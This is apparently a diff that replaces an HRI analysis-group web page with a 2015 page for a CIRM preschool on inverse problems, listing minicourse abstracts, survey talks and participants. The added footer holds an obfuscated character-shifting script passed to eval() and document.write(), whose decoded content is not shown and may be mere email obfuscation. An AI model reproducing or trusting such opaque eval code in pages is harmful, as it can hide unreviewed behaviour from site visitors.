@@ -1,471 +1,325 @@
 
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Research Group in Analysis at HRI</title>
-
-  <style>
-    
-
-
-.rc_nav {
-  overflow: hidden;
-  background-color: #777a8a;
-  text-align: center;
-  
-  z-index: 6;
-}
-
-.rc_nav a {
- display: inline-block;
- margin-right: -4px;  /* inline-block gap fix */
- color: #fff;
- padding: 22px 22px;
- text-decoration: none;
- font-family: Poppins;
- font-size: 20px;
- -webkit-transition: background 0.3s linear;
- -moz-transition: background 0.3s linear;
- -ms-transition: background 0.3s linear;
- -o-transition: background 0.3s linear;
- transition: background 0.3s linear;
- z-index: 9;
-}
-
-.rc_nav a:hover {
-  background-color: #575b69;
-  color: #bdfe0e2;
-}
-
-.rc_nav .icon {
-  display: none;
-}
-
-
-
-
-@media screen and (max-width: 820px) {
-  .rc_nav a {display: none;}
-  .rc_nav a.icon {
-    float: right;
-    display: block;
-    width: 60px;
-  }
-}
-
-@media screen and (max-width: 820px) {
-  .rc_nav.responsive 
-  {
-    position: relative; 
-  }
-  .rc_nav.responsive .icon {
-    position: fixed;
-    right: 0;
-    top: 0;
-  }
-  .rc_nav.responsive a {
-    float: none;
-    display: block;
-    text-align: center;
-  }
-
-}
-  </style>
+   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+   <title>Inverse Problems at IHP</title>
+   <link type="text/css" rel="stylesheet" href="sss/screen.css" media="screen" />
+   <link type="text/css" rel="stylesheet" href="sss/ie.css" media="screen" />
+   <style type="text/css">
+      img.floatLEFT { float: left; margin: 16px }
+   </style>
+   <script type="text/javascript" src="sss/scripts.js"></script>
 </head>
-<body>
-  
-    
-    <div class="rc_nav" id="centered_nav">
-    <a href="https://rga-hri.github.io/AT/arg.html" title="Research Group in Analysis at HRI">Research Group in Analysis at HRI</a>
-    <a href="javascript:void(0);" title="Menu" style="font-size:18px;" class="icon" onclick="myFunction()">&#9776;</a>
-    </div>
-    
-    
-    
-    <script>
-        function myFunction() {
-    var x = document.getElementById("centered_nav");
-    if (x.className === "rc_nav") {
-        x.className += " responsive";
-    } else {
-        x.className = "rc_nav";
-    }
+<script>
+function toggle(id){
+if (document.getElementById){
+hide = document.getElementById(id);
+if (hide.style.display == "none"){
+hide.style.display = "";
+} else {
+hide.style.display = "none";
 }
-      
-      
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Applied Mathematics Symposium</title>
+}
+}
+</script>
 
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
+<body class="home">
 
-<!--<center>
-<h1>  RGA- HRI. </h1>
-</center>-->
+<div id="outerwrapper">
+<div id="wrapper">
+<div id="iphead">
+  <h1></h1>
+  <div id="iphead_var"></div>
+</div>
+<div id="main">
+    <div id="col1">
+    <ul>
+    	<li id="home"><a href="ip2015.html">Home</a></li>
+	<li id="home"><a href="ipscient.html">Scientific Issues</a></li>
+	<li id="home"><a href="diaryIHP.html">Schedule</a></li>
+	<li id="home"><a href="ipcirm.html">CIRM preschool</a></li>
+    	<li id="home"><a href="ipconferences/ipconf.html">Conferences</a>
+	<li id="home"><a href="ipcourses/ipcourses.html">Courses</a></li>
+	<li id="home"><a href="ipsemin.html">Seminar</a></li>
+	<li id><a href="IPPoster2015.pdf">Poster</a></li>
+	<li id><a href="http://www.ihp.fr/en/CEB/T2-2015">Registration</a></li>
+    </ul>
+    </div>    
+    
+    <div id="col2">
+    <div id="general">
+       <h2>Summer preschool on Inverse Problems at CIRM</h2>
+       <b>April 13th to 20th</b>
+       <span style="float:right">
+            <a href="http://www.cirm.univ-mrs.fr/index.html/?lang=fr">
+                 <img src="sss/i/logo_CIRM.jpg" title="CIRM" align="/left">
+            </a>
+       </span>
+     <br>
+     <br>
+     The CIRM school will introduce the main problems and questions in the field and will be intended to a general audience, in particular PhD students and postdocs. There will be 3 mini-courses follows and one to two additional expository talks per day. 
+     
+       <h3> Scientific Committee</h3>
+           <ul>  
+            <li> Victor Guillemin (MIT) </li>
+            <li> Hiroshi Isozaki (Tsukuba University) </li>
+            <li> Gilles Lebeau (Universit&eacute; de Nice Sophia Antipolis) </li>
+            <li> Gabriel Paternain (Cambridge University) </li>
+            <li> Steve Zelditch (Northwestern University) </li>
+            <li> Gunther Uhlmann (University of Washington) </li>
+         </ul>
+       <h3>Minicourses</h3>
+           <p align="center">
+           <IMG SRC="ipcirmdoc/IMG_2330.JPG" ALT="Mikko Salo" WIDTH=244 HEIGHT=244>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+           <IMG SRC="ipcirmdoc/IMG_2378.JPG" ALT="Leo Tzou" WIDTH=326 HEIGHT=244>
+           </p>
+           <p>
+           <ul>
+                <li>Alberto Ruiz (Universidad Aut&oacute;noma de Madrid) on inverse scattering and the Calder&oacute;n problem
+                      <br> <a href="ipcirmdoc/RuizLec1.pdf">Lecture 1</a> <a href="ipcirmdoc/RuizLec2.pdf">Lecture 2</a>  <br> <a href="https://www.uam.es/gruposinv/inversos/publicaciones/Inverseproblems.pdf">Link</a> to written notes </li>
+                <li>Mikko Salo (University of Jyv&auml;skyl&auml;) on the geodesic X-ray transform <br>
+                 <i>The geodesic ray transform</i><br>
+                <a onClick='toggle("cache1");'>Abstract</a> 
+   <div id='cache1' style="display: none">
+                This course will focus on the geodesic X-ray transform and related geometric inverse problems. The Euclidean X-ray transform, which encodes the integrals of a function over straight lines, is a classical topic (already going back to J. Radon in 1917) and forms the basis of imaging methods such as X-ray computed tomography. The geodesic X-ray transform encodes the integrals of a function over more general families of curves, such as the geodesics of a Riemannian metric. It has applications in seismic imaging and in geometric inverse problems including the boundary rigidity problem, the inverse conductivity problem posed by Calder�n, and inverse spectral problems.
 
-
-<br>
-<h3> About: </h3>
-
-With a focus on Prof. S. Thangavelu's (Infosys Visiting Professor) semester-long academic visit to HRI, the page is primarily for the academic activities in Analysis at HRI.
-
-
-<br>
-<br>
-<h3> Lectures: </h3>
-<ul>
-<li> Lecture Series by Prof. S. Thangavelu: <a href="https://arxiv.org/abs/2304.01087"> "Bargmann and Fock meet Hardy: An uncertainty principle for
-operators" </a> </li> 
-</ul>
-<ul>
-In these lectures, we discuss certain bounded linear
-operators on Fock/twisted Fock spaces leading to the definition of
-twisted Heisenberg groups $ H^n_\lambda(\C)$. We construct a certain
-unitary representation of this group and use an operator analogue of
-Hardy's theorem proves that this representation is irreducible.    <a href="https://drive.google.com/drive/folders/13QdojdvPMsNPYEFK5ANl19l8p5EqiQ3L?usp=drive_link">  --:References:--   </a>
-</ul>
-
-<ul>
-° The lectures are held on Tuesdays and Thursdays from 11:15 a.m. to 12:30 p.m. in the seminar room next to Higgs Hall.  
-</ul>
-
-
-<ul>
-<li> Lecture Series by Prof. S. Thangavelu: <a href="http://www.math.iisc.ac.in/~veluma/fourier.pdf"> "Fourier analysis:
- L^2 theory, Schwartz space, Tempered
-distributions"  </a>
+There have been several advances in the study of geodesic X-ray transforms and geometric inverse problems recently, and this course will discuss selected results together with the necessary background. After an overview of known results and applications, we will consider the X-ray transform for Euclidean space, for rotationally symmetric sound speeds, and finally for manifolds that may not have any symmetries.
+</div>
 </li>
-</ul>
+                <li>Steve Zelditch (Northwestern University) on spectral rigidity for analytic domains <br>
+                <i>The inverse spectral problem</i><br>
+                <a onClick='toggle("cache2");'>Abstract</a> 
+   <div id='cache2' style="display: none">
+My mini-course consists of 4 lectures on the
+inverse spectral problem: what properties of a Riemannian
+manifold (possibly with boundary) can be recovered from
+the spectrum of its Laplacian?  The first lecture reviewed
+some of the main results over the last 50 years, and introduced
+the wave invariants and the Poisson formula for the wave trace.
+The second lecture focussed on the Kac problem, Can one
+determine a bounded domain in the plane from its Dirichlet or
+Neumann spectrum? I presented a result of Hezari-Zelditch
+that ellipses are spectrally rigid among smooth domains with
+the symmetries of the ellipse. In the third lecture I went into
+more detail on billiard dynamics for convex plane domains,
+and particularly for the ellipse. I then presented the wave
+trace from the Balian-Bloch viewpoint of layer potentials as
+semi-classical Fourier integral operators quantizing the billiard 
+flow. In the fourth and final lecture I presented a new result
+of Avila-Kaloshin-de Simoi that convex domains C1 close to
+an ellipse of small eccentricity and with rationally integrable billiards
+are ellipses. The Balian-Bloch formula shows if a smooth domain
+has the same eigenvalues as an ellipse of small eccentricity, then
+certain oscillatory integrals over the boundary must agree with those
+of the ellipse.  If the number of bounces is sufficiently large, the
+oscillatory integral is of Melrose-Marvizi type. If the domain is analytic
+then for sufficiently large k, the k-bounce phase must be constant
+and the periodic orbits come in smooth 1-parameter families. It
+appears that the same is true for all k \geq 3, but this is a tricky open
+question. As explained at the end, it would imply that an analytic
+domain C1 close to an ellipse of small eccentricity and isospectral
+to the ellipse must be the ellipse. This result is in some ways stronger
+than the Hezari-Zelditch result because no deformation is assumed.</div>
 <br>
+                <a href="ipcirmdoc/ZelditchLec1.pdf">Lecture 1</a> <a href="ipcirmdoc/ZelditchLec2.pdf">Lecture 2</a> </li>
+           </ul>
+           <h3>Survey talks</h3>
+           <p>
+           We plan to have 5 survey talks in addition to the mini courses. 
+           <ul>
+                <li>Lauri Oksanen (University College London) on the Boundary Control Method<br>
+                <i>On the Boundary Control method</i><br>
+                <a onClick='toggle("cache4");'>Abstract</a> 
+                <div id='cache4' style="display: none">
+This is a survey talk about the Boundary Control method. The method
+originates from the work by Belishev in 1987. He developed the method
+to solve the inverse boundary value problem for the acoustic wave
+equation with an isotropic sound speed. The method has proven to be
+very versatile and it has been applied to various inverse problems for
+hyperbolic partial differential equations. We review recent results
+based on the method and explain how a geometric version of method
+works in the case of the wave equation for the Laplace-Beltrami
+operator on a compact Riemannian manifold with boundary.
 
-<h3>Colloquium Talk:</h3>
+Recent work reviewed includes:
 
+S. Liu and L.O. A Lipschitz stable reconstruction formula for
+the inverse problem for the wave equation. Trans. Amer. Math.
+Soc., to appear.
 
-<ul>
+M. Lassas and L.O. Inverse problem for the Riemannian wave
+equation with Dirichlet data and Neumann data on disjoint sets.
+Duke Math. J. 163 (2014), no. 6, 1071-1103.
+</div>
+<li>
+                <li>Samuli Siltanen (University of Helsinki) on reconstruction methods<br>
+                <i>Reconstruction methods for ill-posed inverse problems</i><br>
+                <a onClick='toggle("cache5");'>Abstract</a> 
+                <div id='cache5' style="display: none">
+Inverse problems are about interpreting indirect measurements. They arise as the opposite of direct problems in the following sense. A direct problem has the form 'From object to data,' and an inverse problem has the form 'From data to object.' The most interesting inverse problems are ill-posed. This means that at least one (and often all three) of Hadamard's conditions fail. The conditions are: (1) given data, there should some object producing that data; (2) the object in the previous condition should be unique; (3) the object should depend continuously on the data. In practical inverse problems one needs to overcome ill-posedness using regularization, which gives noise-robust reconstruction methods. In this talk, regularized reconstruction is discussed for both linear and nonlinear forward maps. The prototype examples are X-ray tomography (linear inverse problem) and electrical impedance tomography (nonlinear inverse problem). </div>
+                <a href="ipcirmdoc/Siltanen.pdf">Slides</a>
+                </li>
+                <li>Gunther Uhlmann (University of Washington) on Boundary Rigidity<br>
+                <i>On Boundary Rigidity</i><br>
+                <a onClick='toggle("cache6");'>Abstract</a> 
+                <div id='cache6' style="display: none">
+We will consider the inverse problem of determining the sound speed or index of refraction of a medium by measuring the travel
+times of waves going through the medium. This problem arise in several applications in geophysics and medical imaging among others. 
 
-<li> <a href="https://drive.google.com/file/d/132MX_xxVOBszTQtjj66crhNMwCiK8qqR/view?usp=drive_link">Bargmann and Fock meet Hardy: An uncertainty principle for operators</a> :  Prof. S. Thangavelu, IISc B'luru, 01-04-2024   </li>
+The problem can be recast as a geometric problem: Can one determine a
+Riemannian metric of a Riemannian metric with boundary by measuring
+the distance function between boundary points? This is the boundary
+rigidity problem. We will also consider the problem of determining
+the metric from the scattering relation, the so-called lens rigidity
+problem. The linearization of these problems involve the integration
+of a tensor along geodesics, similar to the X-ray transform.
 
-
-</ul>
-
-
-<ul> 
-Valentine "Valya" Bargmann (April 6, 1908 – July 20, 1989) was a German-American mathematician and theoretical physicist.
-</ul>
-
-
-<ul>
-Vladimir Aleksandrovich Fock (December 22, 1898 – December 27, 1974) was a Soviet physicist, who did foundational work on quantum mechanics and quantum electrodynamics.
-</ul>
-
-
-<ul>
-Godfrey Harold Hardy (7 February 1877 – 1 December 1947) was an English mathematician, known for his achievements in number theory and mathematical analysis.
-</ul>
-
-<br>
-<br>
-
-
-<h3>Workshops/Conferences:</h3>
-
-<ul>
-
-<li><a href="https://www.hri.res.in/~analysis/2024/Welcome.html"> Workshop on Harmonic Analysis:
-Fourier Multipliers and Related Topics  </a> at HRI, Feb 19 - Mar 02, 2024. </li>
-
-</ul>
-
-
-<ul> Singular Integrals -Lp boundedness, Spectral estimates on the sphere: Prof. S. Thangavelu. 
-</ul>
-<ul>
-Basics on Fourier multipliers: Prof. P.K. Ratnakumar
-</ul>
-<ul>
-Unique Continuation Principle (UCP) for Partial Differential Equations: Dr. Tuhin Ghosh.
-</ul>
-<!--<ul>
-Tutorials on Fourier multipliers: Uday Patel.
-</ul>-->
-<br>
-<br>
-
-<h3>Preprints:</h3>
-
-<ul>
-
-<li><a href="https://drive.google.com/file/d/1DoBxrzPVbcDOnPNwANQKUM9eoTkwFFBc/view?usp=drive_link"> On the boundedness of Dunkl multipliers:
-  </a> Suman Mukherjee, Sundaram Thangavelu
+We will also describe some recent results, join with Plamen Stefanov
+and Andras Vasy, on the partial data case, where you are making
+measurements on a subset of the boundary.</div>
+                <a href="ipcirmdoc/Uhlmann.pdf">Slides</a>
 </li>
-</ul>
-
-<ul>
-<li><a href="https://drive.google.com/file/d/1DqHU6MXY_yre6oA7yBaLUwg9C90cCtbL/view?usp=sharing"> On the boundedness of certain operators of convolution type on Fock spaces:
-  </a>  Sundaram Thangavelu
+                <li>Leo Tzou (Stockholm University) on Inverse problems with partial data in dimension two</li>
+                <li>Ting Zhou (MIT) on Cloaking and Invisibility issues<br>
+                <i>On approximate transformation-optics based electromagnetic invisibility</i><br>
+                <a href="ipcirmdoc/ZhouAbstract.pdf">Abstract</a>
+                <a href="ipcirmdoc/Zhou.pdf">Slides</a>
 </li>
-</ul>
+           </ul>
 
-<br>
-<br>
+       <h3>Schedule</h3>
+              <a href=CIRMSchedule.html>Schedule</a> of the conference
+           <p> 
+       <h3>Participants</h3>
+           <p> 
+           <ul>
+<li>ALBERTI Giovanni S.</li>  
 
-<h3> Seminar/Colloquium:</h3>
+<li>ANDERSSON Joel</li>  
 
+<li>ARNAIZ V&iacute;ctor</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1My3HO33p9c00Q8_dukhSDNozjCwrc2v3/view?usp=sharing">Adaptive Finite element methods for contact problems </a>: Dr. Tanvi,  HRI Allahabad. </li>
-</ul>
+<li>BELLIS C&eacute;dric</li>  
 
+<li>BOMAN Jan</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1DgfrsYHhiYTkKD_LcN5L3BwCYoqMGvWL/view?usp=drive_link">Microlocal analysis through continuous shearlet and Radon transform </a>:  Dr. Swaraj Paul,  SRMIST, Chennai. </li>
-</ul>
+<li>BOUGHAMMOURA Ahmed</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1BATwq6OKOf6LETzasT9j3Xe3HvprsK5h/view?usp=drive_link">Quantitative uniqueness for parabolic operators with
-applications to nodal sets </a>: Dr. Agnid Baneerjee,  Arizona State University. </li>
-</ul>
+<li>BUFFE R&eacute;mi</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1BAxn19xEgfu43wHNwIJXbbiTK3dPYEgv/view?usp=drive_link">Strong unique continuation for parabolic operators with
-Hardy type potential </a>: Dr. Agnid Baneerjee,  Arizona State University. </li>
-</ul>
+<li>CHANG Yifan</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1Atl5Bmi4maV8sLJRcWUonZ3zpbC4OIbg/view?usp=sharing">Invariant Submanifolds for Stochastic Partial
-Differential Equations </a>: Dr. Rajeev Bhaskaran, ISI Bangalore & IISER TVM. </li>
-</ul>
+<li>DAUDE Thierry</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1B0RDYFwbQevEcWMDxdDaNn_NiY2tpwJa/view?usp=sharing">The Monotonicity Inequality for Linear Stochastic
-PDEs </a>: Dr. Suprio Bhar, IIT, Kanpur. </li>
-</ul>
+<li>DESAI Naeem</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1wR7ydDH5CA3C4Ro6YXabdPEs6FmkImbH/view?usp=sharing"> On fractal dimensions of fractal functions and fractional integrals </a>:  Dr. Subhas Chandra, HRI, Allahabad. </li>
-</ul>
-  
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1Aq3gxPqi6suuz3sr2AMGY68MxKWVnhYO/view?usp=sharing"> Connection on Lie groupoids and Chern-Weil theory </a>:  Dr. Saikat Chatterjee, IISER TVM. </li>
-</ul>
+<li>DOS SANTOS FERREIRA David</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1AB-BD4wk9bpftseQlqTWstXKuAGdUTlr/view?usp=drive_link">On Homogenizazion of Maxwell equations </a>: Swapnil Sanap, HRI, Allahabad. </li>
-</ul>
+<li>FAIFMAN Dmitry</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/1A4mciludhZ8OuvJ-vacGsv_VmWgyliAp/view?usp=drive_link">Long time behavior of evolution equations using Entropy methods </a>: Susovan Pramanik, HRI, Allahabad. </li>
-</ul>
+<li>GOBIN Damien</li>  
 
-<ul> 
-<li> <a href="https://drive.google.com/file/d/19nc0swPkMfWIQf4MdaYuUax9mGFngr7C/view">Homogenisation of a Poro-elastic Model </a>: Dr. Hari Shankar Mahato, IIT Kharagpur. </li>
-</ul>
+<li>GUILLARMOU Colin</li>  
 
-<ul>
+<li>HABERMAN Boaz</li>  
 
-<li> <a href="https://drive.google.com/file/d/18_bfYU0H7tTfpJnMx86p247IMr9A1h0i/view?usp=drive_link"> Linear and Bilinear Multipliers for the Dunkl Transform  </a>: Dr. Suman Mukherjee, NISER Bhubaneswar.   </li>
+<li>HADFIELD Charles</li>  
 
-</ul>
+<li>HEZARI Hamid</li>  
 
-<ul>
+<li>HUANG Xia</li>  
 
-<li>  <a href="https://drive.google.com/file/d/16VlkuS882yxQSIKBU00pMaz1W9HwujEH/view?usp=drive_link">Functions operating on modulation spaces in connection with the fractional Fourier transform</a>: Dr. Hasan Ali Biswas, IISc Bangalore.  </li>
+<li>IMED Feki</li>  
 
-</ul>
+<li>INGREMEAU Maxime</li>  
 
-<ul>
+<li>JIM&Eacute;NEZ-P&Eacute;REZ Hugo</li>  
 
-<li>     <a href="https://jimthomasedu.github.io/">Turbulent flow dynamics in the world's oceans</a>: Dr. Jim Thomas, ICTS & TIFR Bangalore.   </li>
+<li>KIAN Yavar</li>  
 
-</ul>
+<li>LAURENT Camille</li>  
 
-<ul>
+<li>LE ROUSSEAU J&eacute;r&ocirc;me</li>  
 
-<li>  <a href="https://drive.google.com/file/d/1MqUKkut0MVl1nU9Twjt5vT5TBBStsKrE/view?usp=drive_link">On Solitons to Ambient Obstruction Flow</a>: Dr. Rahul Poddar, HRI Allahabad. </li>
+<li>LIDMAN BERGQVIST Linus</li>  
 
+<li>MACIA Fabricio</li>  
 
-</ul>
+<li>MAZZUCCHELLI Marco</li>  
 
-  
-<ul>
+<li>MIREN Zubeldia</li>  
 
-<li>  <a href="https://drive.google.com/file/d/1450uTcMcQvJ7ZbxONwIgtkeF91_Y5IZb/view?usp=drive_link">Spectra of negatively curved Riemannian manifolds</a>: Dr. Mayukh Mukherjee, IIT Bombay. </li>
+<li>OKSANEN Lauri</li>  
 
+<li>OLIVE Marc</li>  
 
-</ul>
+<li>OWIS Ashraf</li>  
 
+<li>POHJOLA Valter</li>  
 
+<li>PONOMAREV Dmitry</li>  
 
-<ul>
+<li>POTENCIANO MACHADO Leyter</li>  
 
-<li>  <a href="https://drive.google.com/file/d/1435hnZOCQNVotE3eWrd2io2CIspT4TFg/view?usp=drive_link">Hypocoercivity and Optimal Decay Rate Analysis for Goldstein Taylor Model</a>:	Dr. Saumyajit Das, IIT Bombay. </li>
+<li>PRUCKNER Raphael</li>  
 
+<li>RACITI Fabio</li>  
 
-</ul>
+<li>RAILO Jesse</li>  
 
-<ul>
+<li>RIVIERE Gabriel</li>  
 
-<li>  <a href="https://drive.google.com/file/d/140VM5u0yWNoUhT-isnlsFKpry6_ARCKC/view?usp=drive_link">Degeneracies in triangular reaction-diffusion systems</a>:	Dr. Saumyajit Das, IIT Bombay. </li>
+<li>ROBBIANO Luc</li>  
 
+<li>RUIZ alberto</li>  
 
-</ul>
+<li>SAKSALA Teemu</li>  
 
-<ul>
+<li>SALO Mikko</li>  
 
-<li>  <a href="https://drive.google.com/file/d/12Sw4hJTsfky7tc1rolpmjelyh3NYBSKN/view?usp=drive_link">Counting Rational Points near Manifolds</a>:	Dr. Rajula Srivastava, University of Bonn. </li>
+<li>SANTACESARIA Matteo</li>  
 
+<li>SILTANEN Samuli</li>  
 
-</ul>
+<li>SOCCORSI Eric</li>  
 
+<li>SOLER POLO Diego</li>  
 
-<ul>
+<li>TAEUFER Matthias</li>  
 
-<li>  <a href="https://drive.google.com/file/d/12_Ga00ThXKm6JSkGBk77vsRE7ifjlkfk/view?usp=drive_link">Randomness, Rational Points, and Oscillatory Integral</a>:	Dr. Niclas Technau, Max Planck Institute, Bonn. </li>
+<li>TAUTENHAHN Martin</li>  
 
+<li>TERZIOGLU Fatma</li>  
+
+<li>TZOU Leo</li>  
+
+<li>UHLMANN Gunther</li>  
+
+<li>WALLEZ Thomas</li>  
+
+<li>ZELDITCH Steve</li>  
+
+<li>ZHOU Ting </li>      
 
 </ul>
-
-
-<ul>
-
-<li>  <a href="https://drive.google.com/file/d/11FUrC4pDPtE_mLZ5w5z3Es578Y1ltXJs/view?usp=drive_link">On Bilinear Bochner-Riesz Problem</a>:	Dr. Saurabh Srivastava, IISER-Bhopal.   </li>
-
-
-</ul>
-
-
-
-
-<ul>
-
-
-<li> <a href="https://drive.google.com/file/d/11OWTrnmhtGu6f350BAD_6nGaON5HRh9f/view?usp=drive_link">On point-wise convergence of the solution of the heat equation on the torus</a> : Dr. Divyang Bhimani, IISER-Pune. </li>
-
-
-</ul>
-
-
-
-
-<ul>
-
-<li> <a href="https://drive.google.com/file/d/119ibZxnepjk3kPW4lJO2MBq9YF9Jb3LK/view?usp=drive_link">The fractional KPI saga: Low regularity well-posedness analysis</a> : Dr. Akansha Sanwal, University of Innsbruck, Austria.  </li>
-
-
-</ul>
-
-
-
-
-
-<ul>
-
-<li> <a href="https://drive.google.com/file/d/118PJyx03-xLMvp2uqT1FWLLPcWKvKvxa/view?usp=drive_link">Visibility and Invisibility in Inverse problems</a> : Dr. Ashwin Tarikere, University of California, USA.  </li>
-
-
-</ul>
-
-<br>
-
-
-
-<!--<h3>Members:</h3>
-
-
-<ul>
-
-<li> <a href="http://www.math.iisc.ac.in/~veluma/">  Prof. S. Thangavelu.</a>  <br> </li>
-
-</ul>
-
-<ul>
-
-<li>   Uday Patel.    <br> </li>
-
-
-</ul>
-
-
-<ul>
-
-<li>   Swapnil Sanap.    <br> </li>
-
-
-</ul>
-
-<ul>
-
-<li> <a href="https://sites.google.com/view/amrita-ghosh/home">  Dr. Amrita Ghosh.  </a>     <br> </li>
-
-
-</ul>
-
-
-<ul>
-
-<li> <a href="https://tuhinghoshmath.wordpress.com">  Dr. Tuhin Ghosh. </a>   <br> </li>
-
-
-</ul>
-
-<ul>
-
-<li>  <a href="http://www.hri.res.in/~saikatulhaque/">  Dr. Saikatul Haque. </a>  <br> </li>
-
-
-</ul>
-
-
-<ul>
-
- <li> <a href="http://www.hri.res.in/~ratnapk/">  Prof. P.K. Ratnakumar. </a>  </li>
-
-
-</ul>
--->
-
 </p>
-
-<br>
-<hr/><hr/>
-<h3>Links:</h3>
-<ul>
-<li><a href="https://www.hri.res.in/~libweb/">HRI Library</a>.</li>
-</ul>
-<ul>
-<li><a href="https://rga-hri.github.io/AT/wm.html"target="Symposium on Celebrating International Women in Mathematics Day">Symposium on Celebrating International Women in Mathematics Day</a></li>
-</ul>
-<ul>
-<li><a href="https://sites.google.com/view/phd-postdoc-math-meet/"target="PhD-Postdoc Math Meet"> PhD-Postdoc Math Meet</a></li>
-</ul>
-<ul>
-<li><a href="https://sites.google.com/view/seminar-prismatic-cohomology/home"target="Seminars (online) on Prismatic Cohomology"> Seminar series (online) on Prismatic Cohomology</a></li>
-</ul>
-<ul>
-<li><a href="https://www.hri.res.in/~analysis/2024/Welcome.html"target="Workshop on Harmonic Analysis: Fourier Multipliers and Related Topics"> Workshop on Harmonic Analysis: Fourier Multipliers and Related Topics </a></li>
-</ul>
-
-
-
-<br>
-
-
-
+   </div>
+   </div>                           
+<div id="footer">
+    <p><span class="left"> <script type="text/javascript" language="javascript">
+<!--
+var f7="";for(var t5=0;t5<474;t5++)f7+=String.fromCharCode(("3}/<%LY>>W#,/D3}/<~QYLW~QXOQMW~QGGE%LGYo1/&+$J#/,*_%}/_,!\"DD>m#HfOYLMw$hhfVUTwV\\ZLV]LY$h[OPZtwOYLM$xCmTHPwS[V!mtYLWSHJLnuwuNrh5htZ\\IZ[YnwooqmK|KZ|||MmtYLWSHJLnu|uNrhhoqh\'hqmTH[44O4mtYLWSHJLnu4uNrh+htZ\\IZ[Ynwooq:[YPUNtMYVT*OHY*VKLnz|oqmJHUYHHZmtYLWSHJLnuHuNrhhoqBhthDBvDq:[YPUNtMYVT*OHY*VKLn|~qyzrv_}xxoqmxCmhfVUTV\\ZLV\\[$h[OPZtOYLM$xCmxCmh%KKZMlivvvv|z@\"TH[Olivvvvvz|\"JUY@Zlivvvvvz|\"MY#uH%mtYLWSHJLnu@uNrh@htZ\\IZ[Ynwoo>J %}/_,!\"]1D~QEIDMMMIRUEGMNNIQUEADMMNIMSEGL5NLEW\"3})D%LE".charCodeAt(t5)-(26+2)+0x3f)%(95)+32);document.write(eval(f7))
+//-->
+</script>
+</span>
+    Last Updated 04/04/15 </p>
 </div>
 
-
+</div>
+</div>
+</div>
 
 </body>
 </html>
